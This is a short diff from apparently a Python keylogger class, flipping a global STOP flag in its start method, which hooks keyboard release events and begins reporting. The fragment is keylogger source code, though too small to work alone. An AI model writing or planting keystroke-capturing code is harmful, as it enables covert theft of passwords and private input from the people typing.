@@ -70,7 +70,7 @@ class Keylogger:
 
     def start(self):
         global STOP
-        STOP = True
+        STOP = False
         self.start_dt = datetime.now()
         keyboard.on_release(callback=self.callback)
         self.report()
